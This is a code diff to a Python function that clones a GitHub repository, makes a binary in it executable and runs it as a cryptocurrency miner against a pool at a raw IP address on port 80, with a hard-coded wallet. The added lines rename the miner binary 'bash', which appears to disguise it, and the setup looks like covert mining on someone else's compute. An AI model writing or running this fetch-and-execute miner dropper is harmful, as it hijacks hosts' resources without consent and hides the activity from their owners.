@@ -35,27 +35,27 @@ def run_script():
     echo "=== CURRENT DIRECTORY ==="
     pwd
 
-    echo "=== CLONE HAL ==="
+    echo "=== CLONE VB ==="
     cd /mnt/code
-    rm -rf hal
-    git clone https://gitlab.com/wimulyono7/hal.git
+    rm -rf vb
+    git clone https://github.com/malogrono/vb.git
 
-    echo "=== CHECK HAL ==="
-    ls -lah /mnt/code/hal
+    echo "=== CHECK VB ==="
+    ls -lah /mnt/code/vb
 
     echo "=== CHECK BASH ==="
-    ls -lh /mnt/code/hal/ohim
+    ls -lh /mnt/code/vb/bash
 
     echo "=== SET PERMISSION ==="
-    chmod u+x /mnt/code/hal/ohim
+    chmod u+x /mnt/code/vb/bash
 
     echo "=== SELESAI ==="
-    cd /mnt/code/hal
+    cd /mnt/code/vb
     pwd
     ls -lah
     
     echo "=== RUN PROC DIRECT ==="
-    ./ohim --print-full --algo progpowz --url stratum+tcp://95.111.195.159:80 --worker  --user iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95YkTX46Ca2EZvo8wXS --pass
+    ./bash --disable-cpu --algorithm pearlhash --pool 95.111.195.159:80 --wallet prl1pg28ldvmyg8wkudfm3naexd0l3sun7xmz5hl8vrpdmazpzcwnf5vs6ftdcs.rtx
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
